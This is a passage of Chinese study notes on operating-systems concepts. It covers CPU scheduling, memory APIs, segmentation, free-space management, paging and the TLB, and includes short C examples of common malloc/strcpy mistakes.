将函数 B 所需要的参数先保存到约定的寄存器中，然后跳转到 B 函数的指令入口地址，开始执行 B 函数；函数 B 的指令会自行到约定的寄存器处查找所需要的参数； 问题2：在进程间切换问：由于 CPU 是供不同程序轮流使用的，而操作系统本质上也不外乎是另外一个大一点的程序，当 CPU 在执行其他程序的指令时，操作系统如何将控制权拿回来呢？ 协作模式早期的方案是让程序每隔一段时间做一次系统调用，这个系统调用其实啥事也不作，唯一实现的效果是将控制权切换回给操作系统；但这种模式有个漏洞，即程序本身要遵守约定才，如果程序是一个恶意程序，操作系统就被架空了；当然，为了防止程序权力不受限制，在该模式下，如果程序尝试做一下非法的动作时，例如访问本不应该访问的内存，或者计算以 0 的除法，则会触发异常，导致控制权转回给 OS，接下来 OS 可能会将程序杀死； 非协作模式显然依赖每个程序都会善意的交回控制权是很危险的，因此需要有另外一种机制保证无论如何 CPU 都可以取得控制权；解决办法就是在 CPU 内置一个时钟中断的功能，它会按照提前设置好的时间值，每隔一段时间就触发一次中断异常，然后执行 OS 的异常指令，这样就将 CPU 的执行权交回给 OS 了；除了将异常处理地址写入 CPU 外，启用 CPU 的时间中断功能，也是操作系统在启动时的必做功课之一，这样它才拥有 CPU 控制权的安全保证； CPU 在触发中断时，需要将当前程序的各种寄存器状态保存下来，以便中断结束后，能够从当前程序的中断继续执行； 保存和恢复上下文当中断时钟触发中断异常后，CPU 控制权交加给 OS，OS 需要决定接下来运行哪个程序；如果是要切换到其他程序，OS 需要负责保存当前程序的上下文（保存到进程结构中），以便将来再回来执行该程序时，能够从中断处继续； 问题3：并发当 OS 在处理某个系统调用时，有可能此时发生了一个中断，因此操作系统现在相当于有两个任务要处理了；如何解决并发的问题，不同的操作系统有不同的策略；既可以单纯的禁止和拒绝（代价是当前任务处理过久的话，有可能丢失未处理的那个任务），也可以是引入锁的机制，并发处理（代价是复杂度大大提高）； 当一个 OS 运行的时间越久，由于各种意料之外的情况的存在，它有可能会慢慢累积越来越多的错误，导致出现一些莫明其妙的问题；因此，定期对 OS 进行重启是一种有益的做法；它可以让操作系统恢复到一个初始状态，这个状态得到了更加充分的测试，存在更少的不确定性； 5. 进程调度：介绍当有多个进程在同时运行的时候，不可避免会出现调度的工作，因此需要制定一个调度的策略，以尽可能提高机器的运行效率； 工作负载假设为了判断不同调度策略的效率，先从做一些最简单和简化的基本假设，来作为讨论的起始点，这些基本假设包括： 所有任务同时到达 CPU 每个任务运行相同的时间 一旦开始某个任务，就一直运行到任务完毕再退出，中间不切换； 所有的工作只涉及 CPU ，不使用其他 I&#x2F;O 设备 CPU 已经提前知道每个工作需要运行多少时间； 调度指标为了比较不同调度策略的好坏，还需要设计一个指标，以便将调度策略的效率进行量化；此处假设使用周转时间作为指标 任务周转时间 &#x3D; 完成时间 - 到达时间； 此处的到达时间指任务到达 CPU 的时间（可以先假设为零，即假设所有任务同一时间到达 CPU，供 CPU 进行调度） 先进先出策略 FIFO先进先出策略（First In First Out）的思想很简单，就是先到达的先处理，等处理完了再处理下一个；后到达的先等待； 它的优点是策略的实现很容易很简单； 它的缺点是有可能会增加平均周转时间，因为有可能先到达的任务是一个非常耗时的任务，而后面的任务是小任务，结果导致大量的小任务被迫等待很久以后才能得到处理； 最短任务优先策略 SJF如果任务同时到达，那么最短任务优先（Shortest Job First）是最优的策略，它可以让平均周转时间最低；但现实的问题是任务常常不会同时到达，这就导致如果先到达的任务是一个大任务，即后续到达的小任务仍然需要被迫等待大任务先执行完成，导致平均周转时间相对先进先出并没有什么变化； 最短完成时间优先策略 STCF最短完成时间优先（Shortest Time-to-Completion First）的思想是，当有多个任务到达 CPU 时，即使 CPU 当前已经在处理某个任务，CPU 仍然会比较一下所有这些任务（包括处理中的）的剩余工作时间，最少的那个优先处理； 但这个策略有一个问题，即 CPU 需要提前知道任务的剩余完成时间，但显然这也是不太可能的； 新度量指标：响应时间前面的三个策略都是针对周转时间这个指标来设计的，这在早期的批处理系统是有意义的。在那个年代，开发人员提前将 CPU 要做的工作先准备好，然后一次性的送入 CPU 执行，然后开发人员静静等待结果即可； 但是 PC 后来进入了个人消费者的时代，用户体验也变得越来越重要，因此，响应时间变成了更重要的指标，而不再是周转时间；由于 CPU 处理能力越来越快，分时系统的引入，让 CPU 能够同时处理多个程序； 轮转策略 RR轮转策略（Round-Robin）的思想，就是将程序的运行时间划分时间中断周期的倍数时间，然后 CPU 在多个任务之间不停的轮转执行，直到某个任务结束退出轮转队列为止； 虽然时间片是中断周期的倍数，但是它并不是越短越好，因为 CPU 切换进程是需要成本的，因此在响应时间和切换时间之间，需要采取一个折中平衡的点； 结合 I&#x2F;O轮转策略并没有从总体上降低所有任务的总完成时间，甚至相反，它基本上都大大延长了周转时间，但是它提高了响应时间，让用户体验更好，减少了等待的感觉；但是当任务需要调用 I&#x2F;O 时，轮转策略的周转时间会有所降低； 无法预知一般来说，操作系统对进程任务需要多少时间才能完成并不了解的，因此前面提出的策略都不好使，因为它们都要求操作系统有未卜先知的能力； 6.调度：多级反馈队列现代操作系统使用的是多级反馈队列策略（MLFQ：Multi-Level Feedback Queue）的调度方法，这个方法最早是在 1962 年的时候提出来的；它的目标是兼顾响应时间和周转时间； 基本规则MLFQ 的基本思想是维护多个不同优先级的队列，每次都优先执行高优先级队列中的任务；如果同一个队列中有多个任务，则在这些任务之间使用轮转策略；一个任务在某个时刻只能处于一个队列中； 接下来的核心是，MLFQ 设计了一套规则，用来观察任务接下来的表现，如果根据规则，某个任务被判断为是一个交互为主的任务（例如频繁放弃 CPU 占用，等待用户的键盘输入），则将调高任务的优先级（即把它从低优先的队列中拉出来，放到高优先级的队列中去）； 在任务刚到达时，系统并不知道它是何种类型的任务，因此默认先将其设为最高优先，如果它短时间内不能完成，则不断降低它的优先级； 规则1：如果 A 的优先级大于 B，运行 A； 规则2：如果 A 的优先级等于 B，轮转运行 A 和 B； 尝试1：如何改变优先级 规则3：任务到达时，先将它放在最高优先级的队列； 规则4a：如果任务完整用完分配给它的第一个时间片的话，降低一个优先级（放入另一个队列中）； 规则4b：如果任务在用完时间之前主动释放 CPU，则优先级保持不变； 截止目前的规则，只会降低优先级的动作，还没有调高优先级的动作，但是一个任务可能在不同的时间阶段，其表现形式不同，比如一开始是计算密集型的，之后变成了交互密集型的；目前的规则会导致该任务在后期的交互响应很慢，甚至直接饿死了； 另外还要防止一些任务出现欺诈，即它本质上是计算密集型的任务，即故意在时间片快结束前主动释放 CPU ，从而维持其优先级不变，糊弄调度程序； 尝试2：提升优先级为了避免综合型任务（前期计算密集型，后期交互密集型）被饿死，需要定期关照一下它们，因此引入规则5； 规则5：每经过一段时间 S，就把系统中所有任务重新加入到最高优先级的队列； 这个规则引入了一个新问题，即 S 的大小如何设置的问题；如果 S 设置得太大，则任务仍然有可能饿死；如果设置得太小，则交互型任务的响应时间变慢； 尝试3：更好的计时方式为了避免被一些恶意任务糊弄，调度策略需要改进原来的规则4，从原本的单次计时制，改变为累计时制，即累计该任务在当前队列已经用了多少时间，而不再像原来一样，如果任务主动释放 CPU，就会重新计时；现在不重新计时了，而是不管有无主动释放，或者释放多少次，只计算该任务在当前优先级的队列中，已经占用和消耗了多少分配给它的 CPU 时间；如果该累计时间已经达到配额的上限，就将它的优先级调低； 规则4（改进版）：如果任务用完了其在某个优先级队列中的时间配额，就将它降低一个优先级（不管它中间是否主动释放 CPU，以及释放了多少次）； MLFQ 调优及其他问题为了更好的提高性能，大多数 MLFQ 的实现都支持给不同的优先级队列设置不同的时间配额，整体原则是优先级越高的队列，时间配额越小，单次执行时间越短，即切换也频繁；而优先级越低的队列，时间配置越大（单次执行时间越久）； 至于每种优先级的具体时间配额应该是多少，以及多长时间提升一次所有任务的优先级，不同的 MLFQ 实现有不同的做法；有些是使用配置表，有些是使用数学公式算法； 有些操作系统有内置的调度策略，但站在用户的层面，该默认策略并一定是用户在运行某个进程时最想要的效果，因此，操作系统一般会提高一些接口，供用户或系统管理员进行调用，用来告知操作系统一些建议，以便操作系统可以基于这些建议，做出更好的调度安排； 7.调度：比例份额之前的调度策略目标是最小化响应时间和周转时间；但是如果换成另外一个目标，即保证每个任务都可以分配到一定比例的 CPU 时间，则会衍生另外一种类型的调度算法：比例份额调度策略； 比例份额策略有一些非常简单的实现思路，即彩票制；即让每个进程拥有一定数量的彩票，然后从彩票池中随机抽奖，抽出哪个号码，就运行拥有该彩票号码的进程；如果某个进程的优先级比例高，则就给它分配多一点的彩票，这样它就被抽中的概率就是提高；反之则是下降； 基本概念：彩票数表示份额彩票制的最大亮点是引入了随机性，虽然随机性在短时间内并不能保证概率符合预期，但是只要足够长的时间，就可以无限接近预期；但是随机性最大的好处在于它可以避免出现传统人工算法可能出现的无法覆盖的极端边角情况； 另外一个好处是随机算法实现起来很容易，没有很多复杂的中间状态值需要记录；因此，它运行起来也更快； 虚拟机的内存分配管理也经常使用彩票制来实现； 彩票机制在原始的彩票调度策略下，为了让操作系统能够更加灵活的应对各种使用场景，额外引入了一些配套的机制来改进原始彩票机制，例如： 用户内部的二次分配：假设用户 A 获得系统分配的100 张彩票，而它内部有两个任务要执行，它可以给这两个任务再做一次分配； 彩票转让机制：一个进程可以临时的将自己的彩票转给另外一个进程，以促进另外一个进程更快的执行； 实现思路彩票调度策略实现思路很简单，仅需要一个随机数生成器、一个链表，一个进程结构（保存进程号和它拥有的彩票数）； 当随机数生成出来后，开始遍历链表，判断当前的彩票数，加上之前已经遍历完的彩票数，看是否会大于出奖号码，如果大于，则当前链表节点即是中奖的进程； 为了让遍历更加有效率，最好能够将链表按彩票数从大到小进行排列，这样有助于更快找到中奖号码； 由于彩票算法存在随机性，这意味着当任务的执行时间很短时，彩票算法的分配效率比较糟糕，即并不是公平分配的，而是随机性很大；只有当任务的执行时间很长，需要很多个时间片时，在分配上面就会越发的公平； 如何分配彩票如何分配彩票这个问题，就彩票机制本身来说，并没有提供任何答案。因为操作系统对于即将要运行的进程是未知的，所以自然也不知道应该分配多少彩票给该进程才算是合理的； 步长调度策略由于彩票制的随机性，在小样本数时表现不好，因此通过引入步长的概念来减少这种随机性；它的基本思路是先用一个统一的大数，来除各个进程的彩票数，这样就得到该进程如果想要积累到该大数，需要走多少步；例如假设大数是 10000，则拥有 200 张彩票的步长 &#x3D; 10000 &#x2F; 200 &#x3D; 50 个步长； 步长调度策略是每走一步，就累加记录当前任务的累计步长；在下一轮分配的时候，优先考虑分配给累计步长数最小的进程； 虽然步长调度去除了随机性，但是其实现比彩票调度稍微复杂一点点，因为需要引入全局状态，记录每个任务的累计步长是多少；另外步长调度仍然也还没是没有解决彩票调度存在的问题，即初始化状态下，应该给一个任务分配多少彩票； 小结彩票调度和步长调度并没有在操作系统中得到广泛的采用，其原因即在于未解决初始状态如何分配彩票的问题，但是它们在一些特殊场景中可以使用，例如虚拟机的实现；因为在这些场景中，初始状态分配多少彩票，由用户给出了答案； 8.多处理器的调度多处理器出现的原因在硬件条件方面的限制，即某个时间点，硬件设计人员无法在不增加太多功耗的情况下，当单核 CPU 实现更快的速度，因此通过在一块芯片上放置多个 CPU 来实现曲线救国；但这也给操作系统和应用程序引入了新的挑战，即如何有效利用多核心的处理器来实现效率的提升； 背景：多处理器架构由于 CPU 寄存器的速度远远大于内存，因此在二者之间引入了一层高速缓存，来缓解速度差异过大导致的性能瓶颈；但单 CPU 的情况下，这个机制将很好的工作；但是当引入多个 CPU 内核，而这些内核又共享相同的高速缓存时，问题将变得微妙了起来，因为有可能 A 核的缓存被 B 核改动，导致 A 核再次访问缓存中的数据时，已经不存在了，A 核不得不再次到内存中读取。这个即是所谓的缓存一致性问题（持久性存储的场景也会面临缓存一致性问题，凡是使用缓存提高存储效率的场景，估计都不可避免会面临这个问题）； 同步问题在引入了多 CPU 后，如果一段修改某个数据的代码，被分配到多个 CPU 上并发执行，将带来灾难性的问题，最终的计算数据常常跟预期的不同。这时需要引入互斥锁来保证数据更新操作的原子性才行； 缓存亲和度某个进程交付给某个 CPU 内核执行后，在该 CPU 的寄存器中将维持很多状态，记录着存储在高速缓存中的数据。此时如果将进程切换交给另外一个 CPU 内核执行，由于新的 CPU 内核的寄存器并不知道原先高速缓存中保存的那些状态数据，因此不得不重新到内存中加载；因此，操作系统在调度进程的时候，最好考虑缓存亲和性，将进程仍交付之前的 CPU 进行处理； 如果多核 CPU 共享一份地址转换表的话，或许可以解决这个问题？ 单队列调度单队列多处理器调度（SQMS：Single Queue Multiprocessor Scheduling）实现起来比较简单，基本复用原来单处理器的调度策略即可，即将所有需要调度的工作，放入一个队列中，当某个 CPU 出现空闲时，就到队列中取走一个任务进行处理；但它的缺点有两个： 为了避免多个 CPU 修改同一份数据，需要给数据加锁，但是加锁会带来性能损失； 进程可能在不同的 CPU 之间切换，导致失去了缓存亲和性； 多队列调度多队列多处理器调度（MQMS：Multi-Queue Multiprocessor Scheduling）让每个 CPU 专享一个自己的队列；当一个任务进来后，操作系统根据一定的规则（如随机挑选或者挑选短的队列）将任务放到某个 CPU 的队列中，接下来就跟单处理器的流程一样了； MQMS 的好处是可以保证亲和性，也无须担心进程在 CPU 之间切换带来的性能开销；但它的缺点是有可能造成资源闲置。即某个 CPU 接到一个大任务导致很忙，而其他 CPU 都是一些小任务，很闲，即所谓的负载不均问题； 负载不均的一个解决办法是定期干预的思路，即当某个 CPU 队列开始变闲时，就将较忙的队列上面的任务迁移一个到较闲的队列中； 这种技术称为“工作窃取”，即闲置的 CPU 每隔一段时间就到繁忙的 CPU 那里窃取一个任务过来；但隔多久去窃取一次是个微妙的设定，因为时间太短太频繁的话，会带来较大的切换性能开销；如果时长太长的话，有可能导致负载不均； Linux 的多处理器调度Linux 社区就使用何种调度程序没有达成共识，共有三种常用方案： O(1)：多队列，基于优先级调度，类似 MLFQ； CFS：多队列，基于比例调度，类似步长调度； BFS：单队列，基于比例调度，采用 EEVEF 算法（最早最合适虚拟截止时间优先算法）； 9.抽象：地址空间早期系统最早的时候，操作系统没有提供任何内存方面的抽象，内存的头部存储着操作系统的系统（当时 OS 还在库时代），然后从某个地址之后存着程序的代码，内存中也只有一个程序，没有其他程序； 由于计算机很贵，需要很多人共用，而不是每人一台；因此 OS 开始需要支持多程序并行；这个时候的办法是引入磁盘的帮助，当需要切换程序的时候，就先将当前内存中的数据保存在磁盘里，然后加载另外一个程序； 由于磁盘很慢，上面的方法导致用户需要等待很久，接下来进一步的办法是将内存划分成多个段，每个程序使用其中一个段，然后切换程序的时候，不需要再跟磁盘打交道，只需要从这个段跳到另外一个段即可； 段的技术不错，不过它也引入了一个新的问题，即如何保护程序数据，避免被其他程序非法访问； 地址空间为了解决隔离的问题，操作系统提供了一种虚拟地址空间的约定，在这个约定中，程序拥有巨大的全部内存空间，就像早期系统刚开始时那样，内存中只有一个程序在运行；同时操作系统还引入了地址翻译器，它会将当前进程指令中的虚拟地址，最终翻译为实际的物理地址，然后从该地址中取到数据； 10.插叙：内存操作 API内存类型C 程度有两种内存类型，一种是栈内存，它会编译器自动分配和回收；还有一种是堆内存，它由用户自行申请分配和自己回收（因此很容易忘了回收）； 调用函数申请分配堆内存后，函数一般会返回分配好的堆内存的地址，接下来一般需要将这个地址存在在栈中，以便供后续的代码使用； 问：使用 malloc 分配内存时，返回的地址，是在编译期间，由编译器给出的，还是在指令执行期间，由操作系统给出的？ 答：猜测可以由编译器给出；执行期间，操作系统分配的是物理内存，返回的是物理地址，并且也只是将物理地址写入到页表当中完成映射而已，并不需要返回给应用程序；理论上编译器管理着整个虚拟地址空间； malloc() 调用malloc 用来申请在堆上分配内存 123void *malloc(size_t size);// 使用示例，一般不直接给 malloc 传递 size 字面值，而是通过 sizeof 表达式来获得 size 值，以避免出现错误double *d = (double *)malloc(sizeof(double)); free() 调用free 用来释放堆上的内存，只需将指针作为参数传递给它即可； 好奇：为什么 free 只需指针，无须 size_t 参数，即可知道应该回收多大的内存空间？ 答：因为在分配该内存块时，在其头部有存储着一些额外的信息，其中一项记录着当前内存块的大小。这意味着实际分配的空间比申请时更大一点点；分配完了后返回的指令实际上并不是指向整个内存块的起始位置，而是在中间，即头部信息之后； 常见错误忘了分配内存123456789// 错误示例char *src = &quot;hello&quot;;char *dst; // 没有分配内存，因此该指针并没有指向堆上的空间，是个空指针strcpy(dst, src);// 正确做法char *src = &quot;hello&quot;;char *dst = (char *) malloc(strlen(src) + 1);strcpy(dst, src); 没有分配足够的内存123456// 错误示例char *src = &quot;hello&quot;;char *dst = (char *) malloc(strlen(src)); // 拷贝字符串时，会在末尾添加结束符，因此长度可能不够，取决于 strlen 返回的值是否包含结束符；strcpy(dst, src); // 缓冲区溢出可能会成为安全漏洞来源 忘记初始化分配的内存没有初始化的内存，并不意味着里面没有值，里面有时候会有前人留下的值，结果导致读取到的内容造成了程序错误 忘记释放内存如果没有释放内存，则程序在长时间运行后，由于反复分配内存，最终有可能造成内存溢出； 在用完之前就释放内存读取的时候很可能会出现预期之外的值； 反复释放内存反复释放同一块的结果不可预期，通常会导致程序崩溃； 错误地调用 free()本来想释放 A 指针指向的内存，结果传入了另外一个错误的值做为 free 的参数，结果意外释放了某处的内存，结果有可能导致程序崩溃； 由于手工分配内存很容易造成各种错误隐患，因此一般使用 purify 和 valgrind 等第三方工具来帮忙检查代码中可能存在的错误调用（有点像 lint 的去毛作用）； 底层操作系统支持malloc 和 free 并不是系统调用，它们是库调用；但是它们本后的实现需要有系统调用，一般是 brk（参数为地址）和 sbrk（参数为增量）；这两个函数用来移动堆顶的指针； 除了 malloc 外，还有一个 mmap 调用可以用来分配内存，它的分配方式跟 malloc 有所不同，是在 swap 交换区中分配一个匿名的内存区域； 其他调用calloc：分配堆内存后，会将其中的内容置 0； realloc：分配一个比传入的数组更大的内存，并把数组内容拷贝到其中，再返回新内存的地址； 11.机制：地址转换CPU 很快，但只有一个，所以它通过分时间段轮流使用的方法来实现共享，为了实现高性能，程序的指令直接送达 CPU 进行处理，操作系统仅在发生系统调用或时钟中断时，才介入处理，以帮忙程序完成一些受限功能或取回硬件的控制权； 内存是存储数据的设备，空间足够大，因此它通过分块使用的方法来实现共享（即空间共享）。在设计内存虚拟化时，也需要考虑高性能、安全可控和简单易用的设计目标；它的实现办法是引入地址转换，即抽象一套足够大的虚拟地址空间，由各个程序专用，这样一来就保证了程序在使用内存时的简单易用和安全可控的目标；之后操作系统通过虚拟地址和物理地址的映射表，来和实际的物理内存打交道，程序则完全不用管。 基址+界限机制早期的地址转换使用基址加界限的机制（也叫动态重定位）来实现，CPU 里面增加基址和界限两个寄存器，实际的物理地址 &#x3D; 虚拟物理地址 + 基址，之后再用界限寄存器的值进行核验，避免程序访问的地址越过了允许的边界； 硬件支持为了实现地址转换，需要硬件提供一些内置功能的支持，包括： 区分运行模式：只有在内核模式下，才能运行特权指令； 基址&amp;界限寄存器：用来存放相应的值； 能够转换地址并校验界限 提供修改基址&amp;界限寄存器的指令：以便操作系统可以为每个进程初始化该值； 可在硬件中注册异常处理的特权指令的地址：以便操作系统可以告知 CPU，在发生异常后，应该去哪些地址加载异常处理指令； 提供异常触发机制：以便在进程试图调用特权指令或者访问越界的内存时，能够触发异常； 操作系统支持为了实现地址转换，需要操作系统提供一些功能的支持，包括： 内存管理：为新进程分配内存、回收已结束进程的内存、更新可用内存表； 基址&amp;界限管理：在切换进程时，正确的设置寄存器中的值； 异常处理：提供异常处理指令，以便当异常被触发时，CPU 可以进行调用； 虽然基址+界限的地址转换方式实现起来很简单，但是它也有很大的局限性，即对内存的利用效率比较低，每个进程内部都有大量的空闲内存（即所谓的内部碎片）； 原因在于应用程序有大有小，对内存有不同的需求，在操作系统在一开始的时候，并不知道应该给应用程序分配多少内存比较合理； 12.分段 如何解决基址&amp;界限机制下的空间浪费问题？ 分段：泛化的基址&amp;界限虚拟地址空间通常遵守惯例对内容进行分段，至少包括：代码段、堆、栈等三段；这三段占用的空间大小不同，代码段是固定大小的，而堆、栈是动态大小的；因此，为了避免普通基址界限机制下的空间浪费问题，可以做进一步细分，引入多个基址界限，分别用于对应不同的段；当需要对某段内的虚拟地址进行转换时，只要先计算出该地址相对于段起始地址的偏移量，之后加上段基址在映射表中的物理地址，即是它在物理内存中的真实地址（当然，还需要使用界限值检查一下，如果超过了范围，就会引发段错误 segmentation fault）； 接下来的问题是，当 CPU 拿到一个虚拟地址时，如何知道它属于哪个段？因为只有知道属于哪个段，并且知道该段的起始地址，才有办法计算偏移量 如何知道引用哪个段有两种方式可以用来判断虚拟地址属于哪个段 显式的方法使用虚拟地址的头两位来判断，例如 00 代表代码段，01 代表堆段，10 代表栈段；虚拟地址拿掉头两位，剩下的即是地址在该段内的偏移量，可以直接和界限比较大小来检验是否越界，并且也可以直接加上基址，获得实际的物理内存地址； 隐式的方法通过虚拟地址的来源来实现，当地址来源于程序计数器时，意味着这个地址是代码段中的地址；当地址是基于栈指针或者堆指针的偏移量计算出来的时候，意味着这个地址是栈地址或者堆地址； 如何处理栈的反向增长其实也很简单，当知道了该地址是一个栈地址后，只需要减去栈的起始地址，即可以得到一个负数的偏移量，然后加上基址，即可以得到实际的物理内存地址； 说明栈空间在物理内存中也是反向增长的； 支持共享不同的进程之间，总是难免会使用到一些相同的数据，例如共享库，如果每个进程都存储一份，显然太浪费空间了。通过引入共享段，可以提高内存的使用效率； 实现办法就是给段地址增加几个位（即保护位），用来标记关于该段是否允许共享、是否可执行等一些额外的信息；如此一来，也给 CPU 增加了一些额外的工作，除了做前述检查虚拟地址是否越界外，还需要检查一下当前指令是否跟标记位有冲突，例如指令尝试向只读的段写入数据，或者尝试运行非执行段中的指令等； 段的颗粒度按代码、栈、堆的方式进行分段，是一种比较粗颗粒度的分段；在早期有些系统的设计中，曾经尝试过更加细颗粒度的分段，当时的目的是为了让内存的使用更加高效，当然，分段越多，意味着需要硬件的支持才可行。 操作系统支持虽然分段的方法减少了内存的浪费，提高了使用效率；但是随着进程的不断创建和销毁，物理内存上将存在着越来越来的内存碎片，这些碎片加起来很大，但是它们却是不连续的。这有可能造成明明还有足够多的空闲内存，但却无法满足新建进程的连续性要求。这时候操作系统需要引入一个算法来管理这些碎片，一方面解决如何为新进程找到最合适的空闲内存片段，另一方面负责整理碎片，通过移动已分配内存，让整个内存使用变得紧凑，大部分的非连续碎片能够挨到一起，形成整段的连续内存，从而减少碎片的存在。 管理内存的算法有很多，成百上千，例如最佳匹配、最差匹配、首次匹配等，不过它们只能是尽量减少碎片的产生，暂时还无法完全消除它（因为那意味着要付出其他方面的代价）； 虽然粗颗粒度段的方式部分解决了内存使用效率问题，但其实它并不能完全解决，因为对堆的高效使用，依赖于进程本身在虚拟地址空间中的管理算法。有可能某个进程所用的算法并不高效，导致用的堆空间很多，但其实很稀疏，这无形中就意味着物理空间的浪费 13.空闲空间管理 待解决问题：如何让碎片最小化？ 假设为了方便讨论内存管理算法的实现，先做一些简单的基本假设： 已分配内存在生命周期内大小不变； 内存分配后就不再被移动； 已分配内存是一块连续的区域； 底层机制分割与合并当申请分配的内存比某个空闲块小时，内存分配程序就会对空闲块进行分割； 当释放某个已分配的内存块时，内存分配程序会尝试合并，即先检查一下该内存块前后的内存块是否是空闲的，如果是的话，就跟它们合并成一个更大的空闲内存块； 记录已分配空间的大小当用户在调用 malloc 分配一块新的内存块时，实际分配的大小并不是用户传递的 size_t 参数，而是比它还要大上一点点，因为内存分配程序需要一个额外的头部空间来存储关于当前内存块的一些元信息，例如 size_t 和 magic number；当后续释放该内存块时，这个头部信息将派上用场。它使得用户在调用 free 函数释放内存时，只须传入指针，而无须传入 size；free 会自动根据指针值倒推（减去 header_t）得到真正的起始位置和实际大小； 空闲链表空闲链表是一种数据结构，它保存着哪些内存块是空闲的信息，每个内存块在链表中用一个 node 节点来表示，多个 node 相互连接就形成了空闲链表；每个 node 有两个属性，一个是 size，保存着当前内存的大小信息；一个是指向下一个 node 的指针值； 由于空闲链表用来管理空闲内存，而它自己又是需要内存存储的，因此它的每个节点信息实际是保存在每个空闲内存块的头部里面； 堆的增长大多数内存分配程序在开始只是通过系统调用向操作系统申请一块很小的堆，然后随着时间的推进，如果当前已分配的堆确实已经不够用了（做了各种努力之后，例如已经紧凑过了），分配程序会再次发起系统调用，向操作申请更多的堆空间；操作系统在收到请求后，会分配一块空闲的物理内存页，并将该物理内存的地址，映射到进程的虚拟地址空间中；之后进程就有了更大的堆可以使用了； 问：如果进程的堆是分两次单独申请的，如果操作系统前后给的两个物理空闲页是不连续的，接下来在进行地址转换时，要如何处理？ 答：操作系统使用一个页表来记录映射关系，在做地址转换时，查询该页表，得到正确的物理地址； 问：此处的分配程序，貌似其实是编译器？因为貌似没必要在程序运行期间，去找一个运行时库来管理已分配的内存？ 基本策略最佳匹配遍历整个空闲链表，找到和申请大小最接近的空闲内存块； 优点：最佳匹配，空间浪费最小化； 缺点：遍历比较费时，因此分配时间较久； 最差匹配遍历整个空闲链表，找到最大的块，分割它； 优点：一无是处，只有初衷是好的（它的初衷是想让可用的空闲块尽量的大）； 缺点：遍历费时，碎片还很多； 首次匹配在找到第一个大小满足要求的块后，就不再往下找了； 优点：快，无须遍历； 缺点：链表头部碎片特别多，后续查找的时间开始变长 下次匹配比其他策略多维护一个字段，用来记录上次命中后的位置，然后下一次从那里接着往后找； 优点：性能与首次匹配接近，但碎片更平均化，不会集中在头部； 其他方式分离空闲链表理论上用户每次申请的内存块的大小是不可预知的。但是由于局部性原理，代码对内存空间的使用不可避免存在某些规律，例如某种大小的内存块被申请的次数最多；因此，可以通过单独增加一个专门维护固定大小的块的链表；只要申请的内存块大小等于某个固定值，就交给这个专门的链表来分配；由于每个内存块的大小都是一样的，而且也无须合并，因此块的分配和释放，都可以在常数时间内完成，效率非常高；同时空间也不怎么浪费； 感觉这里开始有点分页的思想了！ 沿着这个思路继续往下开展，可以统计出那些最常用的块的大小，通过增加维护跟该大小一致的链表，来进一步提高内存使用效率； 伙伴系统伙伴系统将整个内存想象成一个巨大的 2 的 N 次方的空间；每当有一个新的分配请求时，就将空间反复进行二分，直到再次二分便无法满足请求时为止； 它的好处在于，当某个块被释放时，它马上可以检查旁边同等大小的伙伴是否空闲，如果空闲，马上就可以进行合并；合并后以后，再次检查伙伴，以此类推；因此它的合并是非常迅速的；而正因为了合并效率高，使得空间的外部碎片变少；但是内部碎片会多一些（因为不是每个请求都刚好是 2 的幂）； 其他想法有些策略的空间利用率高，但付出的代价是查找比较慢；为了进一步压榨提升性能，人们不惜通过牺牲简单性引入复杂性来换取性能，包括使用平衡二叉树、伸展树和偏序树等算法； 事实上并不存在一个完美而万能的分配程序，因为计算机被用于处理非常多完全不同类型的任务，每种任务都有其各自的业务特点；当对业务特点了解得越多的时候，才有可能选用越合适的分配策略，以大幅度的提高性能； 14.分页：简介操作系统有两种管理物理内存的方法： 参照虚拟内存的方法，将物理内存进行不同长度的分段；缺点：随着时间的推移，很容易形成碎片化，分配工作变得越来越困难； 按固定的长度单位，将物理内存分成 N 个单元（每个单元称为一个页）；优点：内存分配比较简单和灵活，因此每个虚拟空间中的页，刚好也映射物理内存中的一个页（通过页表来实现映射）； 由于内存映射是以页为单位的，因此在进行地理转换时，只需转换头部的页号即可，页内的偏移地址并不需要转换； 页表存储在哪里页表还是挺大的，例如对于32位的地址空间，每个页设置为 4 KB，因此需要单个页占用了 12 个位，剩下的 20 个位即是页号；每个页面条目假设占用 4 个字节，单个进程的页表大小为 2^20 * 4 字节，相当于 4 MB； 如果操作系统当前运行着 100 个进程，则总共要使用 400 MB 的物理内存空间来保存页表；这么大的存储量，显然无法保存在 CPU 中，因此通常是将其保存在物理内存中； 分页的代价是引入页表，额外消耗了一些存储空间，但换来了简单性和灵活性，也避免了碎片的问题；而在分段的机制中，是不需要页表的；同时分页也牺牲了一点性能，因为现在地址转换工作增加查询页表的环节； 页表中究竟有什么简化的来看，可以将页表当做一个巨大的数组，以虚拟页号做为索引，来访问其中的元素，元素包含的值除了物理页号外，还有一些额外的位，这些位分别起到不同的控制作用，包括： 有效位：表示是否有数据； 存在位：表示是否被交换到磁盘； 保护位：表示操作权限，例如只读、可写、可执行； 参考位：表示是否被频繁访问，如果是，则应该尽量保存在内存中，避免交换到磁盘； 脏位：表示页面放到内存中了后，是否有被修改过； 其他一些缓存用的位：如 PWT, PCD, PAT, G 等； 分页的性能代价虽然页表的设计让地址转换变得简单了起来，但是以牺牲部分性能为代价的；因为每一次内存引用，都需要做如下的地址转换计算： 从虚拟地址提取虚拟页号； 根据页表基址寄存器存储的基址，以虚拟页号为索引，获得物理页号； 根据物理页号从物理内存中读取数据； CPU 每执行一条指令之前，都需要先从内存中读取指令，之后才知道指令要执行的内容；而指令中可能含有从内存中读取数据或者更新数据的操作，此时 CPU 将需要再做一次内存的操作，以便得到数据或者写入数据； CPU 在程序计数器中存储着下一条指令的地址，在执行指令前，先从该地址将指令加载到 CPU 中，然后解读指令，并进行相关的操作； 除了性能外，分页的另外一个代价是占据较大的物理内存空间； 线性的单级页表确实比较大，但貌似可以通过非线性的多级页表来解决空间占用过大的问题？ 15.分页：快速地址转换 TLB分页固然带来了映射的极大简化，但是如果每执行一条指令，都需要读取物理内存中的页表来作地址转换，这将付出巨大的性能代价，为了弥补这个缺点，一般通过给地址转换器引入缓存来解决，利用局部性原理，减少对物理内存中页表的访问次数，提高地址转换速度； TLB 的基本算法在得到一个虚拟地址后，地址转换器先检查缓存中是否已经有映射条目，如果有则缓存命中，马上可以读取缓存，得到物理页号；如果没有，则需要访问一次物理内存中的页表，将条目写入缓存，之后再重新执行转换（第二次执行可以触发缓存命中） TLB 全称：Translation Lookaside Buffer 单页的尺寸越大，则缓存命中率就会越高；因为最小加载单位是一个页，如果这个页足够大，则接下来要访问的数据，很可能都在这个页中，一般单页的典型大小为 4KB； 如何处理 TLB 未命中有两种处理办法： 硬件办法：由 